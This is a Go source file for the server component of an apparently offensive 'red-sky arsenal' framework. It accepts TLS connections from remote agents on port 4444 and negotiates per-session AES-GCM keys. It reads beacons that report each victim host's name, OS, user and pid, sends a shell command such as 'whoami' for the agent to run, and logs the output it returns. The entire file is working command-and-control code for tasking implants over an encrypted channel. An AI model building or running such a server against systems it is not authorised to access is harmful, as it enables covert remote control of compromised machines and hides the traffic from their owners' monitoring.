// redsky-core — the framework.
// Phase 2: TLS + per-session AES-256-GCM via X25519 ECDH.
package main

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"time"

	"github.com/sk666G/red-sky---arsenal/internal/crypto"
	"github.com/sk666G/red-sky---arsenal/internal/proto"
	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
	"github.com/sk666G/red-sky---arsenal/internal/wire"
)

func main() {
	bind := flag.String("bind", "0.0.0.0", "listen address")
	port := flag.Int("port", 4444, "listen port")
	cmd := flag.String("cmd", "whoami", "command to send to first agent")
	eng := flag.String("engagement", "default", "engagement name")
	flag.Parse()

	root, _ := os.UserHomeDir()
	paths := rsTLS.Paths(filepath.Join(root, ".redsky"), *eng)
	if err := paths.EnsureCA([]string{"127.0.0.1", "localhost"}); err != nil {
		log.Fatalf("ensure CA: %v", err)
	}
	fp, err := paths.CAFingerprint()
	if err != nil {
		log.Fatalf("ca fingerprint: %v", err)
	}
	tlsCfg, err := paths.ServerTLSConfig()
	if err != nil {
		log.Fatalf("tls config: %v", err)
	}

	addr := fmt.Sprintf("%s:%d", *bind, *port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("listen: %v", err)
	}
	log.Printf("redsky-core listening on %s (TLS)", addr)
	log.Printf("engagement dir: %s", paths.Dir)
	log.Printf("CA fingerprint: %s", fp)
	log.Printf("give this to agents with: -ca-fingerprint '%s'", fp)

	tlsLn := rsTLS.NewTLSListener(ln, tlsCfg)
	for {
		conn, err := tlsLn.Accept()
		if err != nil {
			log.Printf("accept: %v", err)
			continue
		}
		go handleConn(conn, *cmd)
	}
}

// handleConn runs the ECDH handshake, then the beacon/task/result loop over
// the encrypted channel.
func handleConn(conn net.Conn, cmd string) {
	defer conn.Close()
	remote := conn.RemoteAddr().String()
	log.Printf("agent connected from %s (TLS ok)", remote)

	// --- ECDH handshake ---
	// 1. Core generates its ephemeral key and sends its pubkey in a hello.
	coreKey, err := crypto.GenerateEphemeralKey()
	if err != nil {
		log.Printf("%s: gen key: %v", remote, err)
		return
	}
	hello := map[string]string{
		"type":    "ecdh_hello",
		"pubkey":  base64.StdEncoding.EncodeToString(coreKey.PublicKey().Bytes()),
		"version": "3",
	}
	helloRaw, _ := json.Marshal(hello)
	if err := wire.WriteFrame(conn, 0, helloRaw); err != nil {
		log.Printf("%s: send hello: %v", remote, err)
		return
	}

	// 2. Read agent's pubkey reply.
	frame, err := wire.ReadFrame(conn)
	if err != nil {
		log.Printf("%s: read hello: %v", remote, err)
		return
	}
	var reply map[string]string
	if err := json.Unmarshal(frame.Payload, &reply); err != nil {
		log.Printf("%s: bad hello: %v", remote, err)
		return
	}
	if reply["type"] != "ecdh_reply" {
		log.Printf("%s: expected ecdh_reply, got %s", remote, reply["type"])
		return
	}
	agentPub, err := base64.StdEncoding.DecodeString(reply["pubkey"])
	if err != nil {
		log.Printf("%s: bad agent pubkey: %v", remote, err)
		return
	}
	key, err := crypto.DeriveKey(coreKey, agentPub)
	if err != nil {
		log.Printf("%s: derive key: %v", remote, err)
		return
	}
	sess, err := crypto.NewSession(key)
	if err != nil {
		log.Printf("%s: new session: %v", remote, err)
		return
	}
	log.Printf("  session key fp: %s", sess.Fingerprint())

	// --- encrypted loop ---
	// 3. Read beacon (encrypted)
	frame, err = wire.ReadFrame(conn)
	if err != nil {
		log.Printf("%s: read encrypted beacon: %v", remote, err)
		return
	}
	beaconRaw, err := sess.Decrypt(frame.Payload)
	if err != nil {
		log.Printf("%s: decrypt beacon: %v", remote, err)
		return
	}
	var env proto.Envelope
	if err := json.Unmarshal(beaconRaw, &env); err != nil {
		log.Printf("%s: beacon envelope: %v", remote, err)
		return
	}
	var beacon proto.Beacon
	if err := json.Unmarshal(env.Payload, &beacon); err != nil {
		log.Printf("%s: beacon payload: %v", remote, err)
		return
	}
	log.Printf("=== BEACON (encrypted) ===")
	log.Printf("  agent_id: %s", beacon.AgentID)
	log.Printf("  hostname: %s", beacon.Info.Hostname)
	log.Printf("  os/arch:  %s/%s", beacon.Info.OS, beacon.Info.Arch)
	log.Printf("  user:     %s (uid %d)", beacon.Info.User, beacon.Info.UID)
	log.Printf("  pid:      %d", beacon.Info.PID)
	log.Printf("  caps:     %v", beacon.Info.Capabilities)

	// 4. Send task (encrypted)
	task := proto.Task{
		ID:      fmt.Sprintf("t-%d", time.Now().UnixNano()),
		Cmd:     cmd,
		Args:    []string{},
		Timeout: 30,
	}
	if err := sendEncrypted(conn, sess, proto.TypeTask, task); err != nil {
		log.Printf("%s: send task: %v", remote, err)
		return
	}
	log.Printf("sent encrypted task %s: %s", task.ID, task.Cmd)

	// 5. Read result (encrypted)
	conn.SetReadDeadline(time.Now().Add(45 * time.Second))
	frame, err = wire.ReadFrame(conn)
	if err != nil {
		log.Printf("%s: read encrypted result: %v", remote, err)
		return
	}
	resultRaw, err := sess.Decrypt(frame.Payload)
	if err != nil {
		log.Printf("%s: decrypt result: %v", remote, err)
		return
	}
	if err := json.Unmarshal(resultRaw, &env); err != nil {
		log.Printf("%s: result envelope: %v", remote, err)
		return
	}
	var result proto.Result
	if err := json.Unmarshal(env.Payload, &result); err != nil {
		log.Printf("%s: result payload: %v", remote, err)
		return
	}
	log.Printf("=== RESULT (encrypted) ===")
	log.Printf("  task_id:   %s", result.TaskID)
	log.Printf("  exit_code: %d", result.ExitCode)
	log.Printf("  stdout:    %s", result.Stdout)
	if result.Stderr != "" {
		log.Printf("  stderr:    %s", result.Stderr)
	}
	log.Printf("session closed for %s", remote)
}

func sendEncrypted(conn net.Conn, sess *crypto.Session, t proto.MessageType, payload any) error {
	raw, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	env := proto.Envelope{Type: t, Payload: raw}
	envBytes, err := json.Marshal(env)
	if err != nil {
		return err
	}
	encrypted, err := sess.Encrypt(envBytes)
	if err != nil {
		return err
	}
	return wire.WriteFrame(conn, wire.FlagEncrypted, encrypted)
}
